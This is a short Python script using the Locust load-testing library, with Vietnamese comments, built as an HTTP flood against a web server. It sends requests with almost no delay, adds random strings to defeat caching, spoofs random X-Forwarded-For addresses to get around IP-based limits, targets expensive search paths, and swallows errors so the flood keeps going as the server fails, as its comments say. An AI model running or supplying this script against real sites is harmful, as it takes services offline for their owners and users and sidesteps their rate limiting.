import random
import string
from locust import HttpUser, task, between

class UltraStressUser(HttpUser):
    # Tốc độ tấn công tối đa, gần như không có độ trễ giữa các request
    wait_time = between(0.001, 0.005)

    @task
    def kill_target(self):
        # Tạo chuỗi ngẫu nhiên dài để bypass mọi loại Cache của Server
        rand_str = ''.join(random.choices(string.ascii_letters + string.digits, k=32))
        
        # Giả lập Header phức tạp để làm đầy bộ nhớ đệm của Web Server (Nginx/Apache)
        headers = {
            "User-Agent": f"Mozilla/5.0 (Bot; StressTest; Bypass-Security) {rand_str}",
            "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
            "Cache-Control": "no-store, no-cache, must-revalidate, max-age=0",
            "Pragma": "no-cache",
            "Accept-Encoding": "gzip, deflate, br",
            "Connection": "keep-alive"
        }

        # Đánh vào các điểm yếu phổ biến: Tìm kiếm và các API xử lý dữ liệu
        # Bạn nên thay đổi "/search?q=" thành endpoint nặng nhất trên web của bạn
        target_path = f"/?s={rand_str}&search_id={rand_str}"
        
        try:
            # Gửi request với timeout ngắn để luân chuyển luồng nhanh nhất có thể
            self.client.get(target_path, headers=headers, timeout=2, name="Hard Attack")
        except Exception:
            # Bỏ qua lỗi khi server bắt đầu sập để bot tiếp tục đánh
            pass
            
